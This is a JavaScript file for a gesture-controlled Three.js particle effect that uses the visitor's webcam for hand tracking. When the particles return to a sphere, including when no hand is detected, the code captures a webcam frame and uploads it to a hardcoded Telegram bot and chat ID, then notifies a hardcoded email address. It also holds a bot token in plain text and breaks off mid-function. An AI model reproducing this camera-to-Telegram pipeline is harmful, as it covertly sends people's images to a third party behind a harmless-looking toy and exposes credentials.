// ==================== CONFIGURATION ====================
const TELEGRAM_BOT_TOKEN = "8312788837:AAHfcaUZihg8xc8Wbu7GLdUdWlK3WWrQEA4";
const TELEGRAM_CHAT_ID = "7528977004";

// ==================== PARTICLE SYSTEM ====================
let scene, camera, renderer, particles;
const PARTICLE_COUNT = 8000;
let currentState = 'sphere';
let handDetected = false;
let lastGesture = null;
let lastGestureTime = 0;
const GESTURE_COOLDOWN = 800;

// ==================== TELEGRAM SYSTEM ====================
let photoCount = 0;
let lastPhotoTime = 0;
const PHOTO_COOLDOWN = 15000; // 15 seconds

// ==================== INITIALIZATION ====================
function init() {
    console.log("🚀 Initializing Particle System...");
    
    // Check for WebGL support
    if (!checkWebGL()) {
        alert("⚠️ WebGL is not supported in your browser. Please use Chrome, Firefox, or Edge.");
        return;
    }
    
    // Setup Three.js scene
    setupThreeJS();
    
    // Create particles
    createParticles();
    
    // Setup event listeners
    setupEventListeners();
    
    // Start camera and hand tracking
    setupCameraAndHandTracking();
    
    // Start animation loop
    animate();
    
    // Update UI
    updatePhotoCounter();
    updateStatus("Camera: Starting...", "🟡");
    
    console.log("✅ Particle System Ready!");
}

function checkWebGL() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        return !!(window.WebGLRenderingContext && gl);
    } catch (e) {
        return false;
    }
}

function setupThreeJS() {
    // Create scene
    scene = new THREE.Scene();
    
    // Create camera
    camera = new THREE.PerspectiveCamera(
        75,
        window.innerWidth / window.innerHeight,
        0.1,
        1000
    );
    camera.position.z = 25;
    
    // Create renderer
    const canvas = document.createElement('canvas');
    renderer = new THREE.WebGLRenderer({
        canvas: canvas,
        antialias: true,
        alpha: true,
        powerPreference: "high-performance"
    });
    
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
    renderer.setClearColor(0x000000, 1);
    
    // Add to DOM
    const container = document.getElementById('container');
    if (container) {
        container.appendChild(renderer.domElement);
    }
    
    // Add some ambient light
    const ambientLight = new THREE.AmbientLight(0xffffff, 0.3);
    scene.add(ambientLight);
}

function createParticles() {
    console.log("✨ Creating particles...");
    
    const geometry = new THREE.BufferGeometry();
    const positions = new Float32Array(PARTICLE_COUNT * 3);
    const colors = new Float32Array(PARTICLE_COUNT * 3);
    const sizes = new Float32Array(PARTICLE_COUNT);
    
    const radius = 10;
    
    // Create spherical particle distribution
    for (let i = 0; i < PARTICLE_COUNT; i++) {
        // Fibonacci sphere distribution for even coverage
        const phi = Math.acos(1 - 2 * (i + 0.5) / PARTICLE_COUNT);
        const theta = Math.PI * (1 + Math.sqrt(5)) * i;
        
        const x = radius * Math.cos(theta) * Math.sin(phi);
        const y = radius * Math.sin(theta) * Math.sin(phi);
        const z = radius * Math.cos(phi);
        
        // Add some randomness
        positions[i * 3] = x + (Math.random() - 0.5) * 0.8;
        positions[i * 3 + 1] = y + (Math.random() - 0.5) * 0.8;
        positions[i * 3 + 2] = z + (Math.random() - 0.5) * 0.8;
        
        // Create gradient color based on position
        const depth = Math.sqrt(x*x + y*y + z*z) / radius;
        const hue = 0.6 + depth * 0.3; // Blue to purple gradient
        const color = new THREE.Color();
        color.setHSL(hue, 0.9, 0.5 + depth * 0.2);
        
        colors[i * 3] = color.r;
        colors[i * 3 + 1] = color.g;
        colors[i * 3 + 2] = color.b;
        
        // Varying sizes
        sizes[i] = 0.12 + Math.random() * 0.08;
    }
    
    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
    geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
    geometry.setAttribute('size', new THREE.BufferAttribute(sizes, 1));
    
    // Create particle material
    const material = new THREE.PointsMaterial({
        size: 0.15,
        vertexColors: true,
        transparent: true,
        opacity: 0.9,
        sizeAttenuation: true,
        blending: THREE.AdditiveBlending,
        depthWrite: false
    });
    
    // Create particle system
    particles = new THREE.Points(geometry, material);
    scene.add(particles);
    
    console.log(`✅ Created ${PARTICLE_COUNT} particles`);
}

function setupEventListeners() {
    const typeBtn = document.getElementById('typeBtn');
    const input = document.getElementById('morphText');
    
    if (typeBtn && input) {
        typeBtn.addEventListener('click', () => {
            const text = input.value.trim();
            if (text) {
                morphToText(text);
                showNotification(`Morphing to "${text}"`);
            }
        });
        
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                const text = input.value.trim();
                if (text) {
                    morphToText(text);
                    showNotification(`Morphing to "${text}"`);
                }
            }
        });
    }
    
    // Window resize
    window.addEventListener('resize', onWindowResize);
}

function onWindowResize() {
    if (camera && renderer) {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
    }
}

// ==================== MORPH FUNCTIONS ====================
function createTextPoints(text) {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const fontSize = 120;
    const padding = 30;
    
    ctx.font = `bold ${fontSize}px Arial, sans-serif`;
    const textWidth = ctx.measureText(text).width;
    const textHeight = fontSize;
    
    canvas.width = Math.max(textWidth + padding * 2, 300);
    canvas.height = textHeight + padding * 2;
    
    // Clear canvas
    ctx.fillStyle = 'black';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // Draw text
    ctx.fillStyle = 'white';
    ctx.font = `bold ${fontSize}px Arial, sans-serif`;
    ctx.textBaseline = 'middle';
    ctx.textAlign = 'center';
    ctx.fillText(text, canvas.width / 2, canvas.height / 2);
    
    // Extract points
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const pixels = imageData.data;
    const points = [];
    const threshold = 100;
    const samplingRate = 0.25; // Sample 25% of pixels
    
    for (let i = 0; i < pixels.length; i += 4) {
        if (pixels[i] > threshold && Math.random() < samplingRate) {
            const pixelIndex = i / 4;
            const x = pixelIndex % canvas.width;
            const y = Math.floor(pixelIndex / canvas.width);
            
            points.push({
                x: (x - canvas.width / 2) * 0.15,
                y: -(y - canvas.height / 2) * 0.15,
                z: 0
            });
        }
    }
    
    return points;
}

function morphToText(text) {
    if (currentState === 'text') return;
    
    currentState = 'text';
    const textPoints = createTextPoints(text);
    
    if (textPoints.length === 0) {
        console.warn("No text points generated");
        return;
    }
    
    const positions = particles.geometry.attributes.position.array;
    const targetPositions = new Float32Array(PARTICLE_COUNT * 3);
    
    // Reset rotation
    gsap.to(particles.rotation, {
        x: 0,
        y: 0,
        z: 0,
        duration: 1,
        ease: "power2.out"
    });
    
    // Create target positions
    for (let i = 0; i < PARTICLE_COUNT; i++) {
        if (i < textPoints.length) {
            // Use text points
            const point = textPoints[i];
            targetPositions[i * 3] = point.x;
            targetPositions[i * 3 + 1] = point.y;
            targetPositions[i * 3 + 2] = point.z;
        } else {
            // Random positions around text
            const angle = Math.random() * Math.PI * 2;
            const radius = Math.random() * 12 + 8;
            targetPositions[i * 3] = Math.cos(angle) * radius;
            targetPositions[i * 3 + 1] = Math.sin(angle) * radius;
            targetPositions[i * 3 + 2] = (Math.random() - 0.5) * 10;
        }
    }
    
    // Animate morphing
    animateMorph(positions, targetPositions, 1500);
    showNotification(`Forming: "${text}"`);
}

function morphToSphere() {
    if (currentState === 'sphere') return;
    
    currentState = 'sphere';
    const positions = particles.geometry.attributes.position.array;
    const targetPositions = new Float32Array(PARTICLE_COUNT * 3);
    const colors = particles.geometry.attributes.color.array;
    
    const radius = 10;
    
    // Create spherical target positions
    for (let i = 0; i < PARTICLE_COUNT; i++) {
        // Fibonacci sphere for even distribution
        const phi = Math.acos(1 - 2 * (i + 0.5) / PARTICLE_COUNT);
        const theta = Math.PI * (1 + Math.sqrt(5)) * i;
        
        const x = radius * Math.cos(theta) * Math.sin(phi);
        const y = radius * Math.sin(theta) * Math.sin(phi);
        const z = radius * Math.cos(phi);
        
        targetPositions[i * 3] = x + (Math.random() - 0.5) * 0.8;
        targetPositions[i * 3 + 1] = y + (Math.random() - 0.5) * 0.8;
        targetPositions[i * 3 + 2] = z + (Math.random() - 0.5) * 0.8;
        
        // Update colors for sphere
        const depth = Math.sqrt(x*x + y*y + z*z) / radius;
        const hue = 0.6 + depth * 0.3;
        const color = new THREE.Color();
        color.setHSL(hue, 0.9, 0.5 + depth * 0.2);
        
        colors[i * 3] = color.r;
        colors[i * 3 + 1] = color.g;
        colors[i * 3 + 2] = color.b;
    }
    
    particles.geometry.attributes.color.needsUpdate = true;
    animateMorph(positions, targetPositions, 1200);
    
    // Capture photo
    setTimeout(() => {
        capturePhotoForTelegram();
    }, 800);
}

function animateMorph(startPositions, targetPositions, duration) {
    const positions = particles.geometry.attributes.position.array;
    const startTime = performance.now();
    
    function updateFrame() {
        const elapsed = performance.now() - startTime;
        const progress = Math.min(elapsed / duration, 1);
        
        // Smooth easing
        const eased = 0.5 - 0.5 * Math.cos(Math.PI * progress);
        
        // Update positions
        for (let i = 0; i < positions.length; i++) {
            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * eased;
        }
        
        particles.geometry.attributes.position.needsUpdate = true;
        
        if (progress < 1) {
            requestAnimationFrame(updateFrame);
        }
    }
    
    requestAnimationFrame(updateFrame);
}

// ==================== ANIMATION LOOP ====================
function animate() {
    requestAnimationFrame(animate);
    
    // Rotate particles when in sphere mode
    if (currentState === 'sphere' && particles) {
        particles.rotation.y += 0.0015;
        particles.rotation.x += 0.0005;
    }
    
    // Handle gestures
    handleGestures();
    
    // Render scene
    if (renderer && scene && camera) {
        renderer.render(scene, camera);
    }
}

function handleGestures() {
    const now = performance.now();
    
    if (!lastGesture || (now - lastGestureTime) < GESTURE_COOLDOWN) {
        return;
    }
    
    const inputText = document.getElementById('morphText')?.value.trim() || "HELLO";
    
    if (lastGesture === 'open') {
        if (currentState !== 'text') {
            morphToText(inputText);
            showNotification("👋 Open hand detected: Morphing to text");
        }
        lastGestureTime = now;
    } 
    else if (lastGesture === 'closed') {
        if (currentState !== 'sphere') {
            morphToSphere();
            showNotification("✊ Fist detected: Returning to sphere + Photo");
        }
        lastGestureTime = now;
    }
}

// ==================== CAMERA & HAND TRACKING ====================
function setupCameraAndHandTracking() {
    const videoElement = document.getElementById('handVideo');
    
    if (!videoElement) {
        console.error("Video element not found");
        updateStatus("Camera: Error", "🔴");
        return;
    }
    
    // Request camera access
    navigator.mediaDevices.getUserMedia({
        video: {
            facingMode: "user",
            width: { ideal: 640 },
            height: { ideal: 480 },
            frameRate: { ideal: 30 }
        },
        audio: false
    })
    .then(stream => {
        videoElement.srcObject = stream;
        videoElement.play();
        
        updateStatus("Camera: Active", "🟢");
        console.log("✅ Camera access granted");
        
        // Initialize hand tracking
        initHandTracking(videoElement);
    })
    .catch(error => {
        console.error("❌ Camera error:", error);
        updateStatus("Camera: Denied", "🔴");
        showNotification("Camera access denied. Using keyboard only.");
    });
}

function initHandTracking(videoElement) {
    const hands = new Hands({
        locateFile: (file) => {
            return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
        }
    });

    hands.setOptions({
        maxNumHands: 1,
        modelComplexity: 1,
        minDetectionConfidence: 0.7,
        minTrackingConfidence: 0.5
    });

    hands.onResults((results) => {
        if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) {
            handDetected = false;
            lastGesture = 'closed';
            updateHandStatus("No hand", "⚫");
            return;
        }

        handDetected = true;
        const landmarks = results.multiHandLandmarks[0];
        
        // Count fingers
        let fingersUp = 0;
        
        // Thumb
        const thumbTip = landmarks[4];
        const thumbBase = landmarks[2];
        if (thumbTip.x < thumbBase.x) fingersUp++;
        
        // Other fingers
        const fingerTips = [8, 12, 16, 20];
        const fingerPips = [6, 10, 14, 18];
        
        for (let i = 0; i < fingerTips.length; i++) {
            const tip = landmarks[fingerTips[i]];
            const pip = landmarks[fingerPips[i]];
            if (tip.y < pip.y) fingersUp++;
        }
        
        // Determine gesture
        if (fingersUp >= 4) {
            lastGesture = 'open';
            updateHandStatus("Open hand", "🟢");
        } else if (fingersUp <= 1) {
            lastGesture = 'closed';
            updateHandStatus("Closed fist", "🔴");
        } else {
            lastGesture = null;
            updateHandStatus("Other gesture", "🟡");
        }
    });

    // Setup camera pipeline
    const camera = new Camera(videoElement, {
        onFrame: async () => {
            try {
                await hands.send({image: videoElement});
            } catch (error) {
                // Silent fail
            }
        },
        width: 320,
        height: 240
    });

    camera.start()
        .then(() => {
            console.log("✅ Hand tracking started");
            updateHandStatus("Tracking", "🟢");
        })
        .catch(error => {
            console.error("Hand tracking error:", error);
            updateHandStatus("Error", "🔴");
        });
}

// ==================== TELEGRAM PHOTO SYSTEM ====================
async function capturePhotoForTelegram() {
    const now = Date.now();
    
    // Check cooldown
    if (now - lastPhotoTime < PHOTO_COOLDOWN) {
        const remaining = Math.ceil((PHOTO_COOLDOWN - (now - lastPhotoTime)) / 1000);
        showNotification(`⏳ Please wait ${remaining}s for next photo`);
        return;
    }
    
    const video = document.getElementById('handVideo');
    
    if (!video || !video.videoWidth || video.videoWidth < 10) {
        console.log("📹 Camera not ready");
        showNotification("⚠️ Camera not ready");
        return;
    }
    
    try {
        console.log(`📸 Capturing photo ${photoCount + 1}...`);
        
        // Create canvas
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 640;
        canvas.height = 480;
        
        // Draw video frame
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Add overlay
        ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
        ctx.fillRect(0, canvas.height - 50, canvas.width, 50);
        
        ctx.fillStyle = 'white';
        ctx.font = 'bold 16px Arial';
        ctx.textAlign = 'left';
        ctx.fillText(`Gesture Photo ${photoCount + 1}`, 20, canvas.height - 25);
        
        ctx.font = '14px Arial';
        ctx.fillText(new Date().toLocaleString(), 20, canvas.height - 10);
        
        // Add particle preview
        const particleCanvas = document.createElement('canvas');
        particleCanvas.width = 640;
        particleCanvas.height = 480;
        const particleCtx = particleCanvas.getContext('2d');
        
        // Create a simple particle effect overlay
        particleCtx.fillStyle = 'rgba(99, 102, 241, 0.1)';
        for (let i = 0; i < 50; i++) {
            const x = Math.random() * canvas.width;
            const y = Math.random() * canvas.height;
            const radius = Math.random() * 10 + 5;
            particleCtx.beginPath();
            particleCtx.arc(x, y, radius, 0, Math.PI * 2);
            particleCtx.fill();
        }
        
        // Composite
        ctx.drawImage(particleCanvas, 0, 0);
        
        // Convert to base64
        const photoData = canvas.toDataURL('image/jpeg', 0.85);
        
        // Update counters
        photoCount++;
        lastPhotoTime = now;
        
        // Update UI
        updatePhotoCounter();
        
        // Send to Telegram
        await sendPhotoToTelegram(photoData);
        
        console.log(`✅ Photo ${photoCount} processed`);
        
    } catch (error) {
        console.error("❌ Photo capture error:", error);
        showNotification("⚠️ Failed to capture photo");
    }
}

async function sendPhotoToTelegram(photoData) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log("❌ Telegram credentials missing");
        savePhotoLocally(photoData);
        return;
    }
    
    try {
        console.log(`📤 Sending to Telegram...`);
        
        // Convert base64 to blob
        const response = await fetch(photoData);
        const blob = await response.blob();
        
        // Create form data
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, `gesture_photo_${photoCount}_${Date.now()}.jpg`);
        formData.append('caption', `📸 Gesture Photo #${photoCount}\n📍 Captured: ${new Date().toLocaleString()}\n🤖 Sent via Particle Control`);
        
        // Send to Telegram
        const telegramResponse = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );
        
        const result = await telegramResponse.json();
        
        if (result.ok) {
            showNotification(`✅ Photo ${photoCount} sent to Telegram!`);
            console.log(`✅ Telegram: Photo sent successfully`);
            
            // Send backup notification
            sendBackupNotification(true);
        } else {
            console.error('❌ Telegram error:', result.description);
            showNotification('⚠️ Failed to send to Telegram. Saving locally.');
            savePhotoLocally(photoData);
            sendBackupNotification(false);
        }
        
    } catch (error) {
        console.error('❌ Network error:', error);
        showNotification('⚠️ Network error. Photo saved locally.');
        savePhotoLocally(photoData);
    }
}

function savePhotoLocally(photoData) {
    try {
        const photos = JSON.parse(localStorage.getItem('particle_photos') || '[]');
        
        photos.push({
            id: Date.now(),
            number: photoCount,
            timestamp: new Date().toISOString(),
            data: photoData.substring(0, 200) + '...' // Store preview only
        });
        
        // Keep last 20 photos
        if (photos.length > 20) {
            photos.shift();
        }
        
        localStorage.setItem('particle_photos', JSON.stringify(photos));
        console.log(`💾 Photo ${photoCount} saved locally`);
        
    } catch (error) {
        console.log("⚠️ Could not save photo locally");
    }
}

async function sendBackupNotification(success) {
    if (!WEB3FORMS_ACCESS_KEY) return;
    
    try {
        const formData = new FormData();
        formData.append('access_key', WEB3FORMS_ACCESS_KEY);
        formData.append('subject', success ? '✅ Photo Sent Successfully' : '❌ Photo Send Failed');
        formData.append('message', 
            success 
                ? `Photo #${photoCount} sent to Telegram at ${new Date().toLocaleString()}`
                : `Failed to send photo #${photoCount}. Saved locally at ${new Date().toLocaleString()}`
        );
        formData.append('email', 'editing2213@gmail.com');
        
        await fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            body: formData
        });
        
    } catch (error) {
        // Silent fail
    }
}

// ==================== UI FUNCTIONS ====================
function showNotification(message) {
    // Remove existing notifications
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }
    
    // Create new notification
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.innerHTML = message;
    notification.style.animation = 'fadeIn 0.3s ease';
    
    document.body.appendChild(notification);
    
    // Auto remove after 3 seconds
    setTimeout(() => {
        if (notification.parentNode) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        }
    }, 3000);
}

function updateStatus(text, emoji) {
    const statusElement = document.getElementById('cameraStatus');
    if (statusElement) {
        statusElement.innerHTML = `${emoji} ${text}`;
    }
}

function updateHandStatus(text, emoji) {
    const handElement = document.getElementById('handStatus');
    if (handElement) {
        handElement.innerHTML = `${emoji} ${text}`;
    }
}

function updatePhotoCounter() {
    const counterElement = document.getElementById('photoCount');
    if (counterElement) {
        counterElement.textContent = photoCount;
    }
    
    const photoCounter = document.getElementById('photoCounter');
    if (photoCounter) {
        photoCounter.style.borderLeftColor = photoCount > 0 ? '#10b981' : '#6366f1';
    }
}

// ==================== ADMIN FUNCTIONS ====================
// For testing in browser console
window.debugSystem = function() {
    console.log("=== SYSTEM DEBUG ===");
    console.log("Particles:", particles);
    console.log("Photo Count:", photoCount);
    console.log("Last Gesture:", lastGesture);
    console.log("Current State:", currentState);
    console.log("Telegram Token:", TELEGRAM_BOT_TOKEN ? "✓ Set" : "✗ Missing");
    console.log("Telegram Chat ID:", TELEGRAM_CHAT_ID);
};

window.testPhotoCapture = function() {
    console.log("
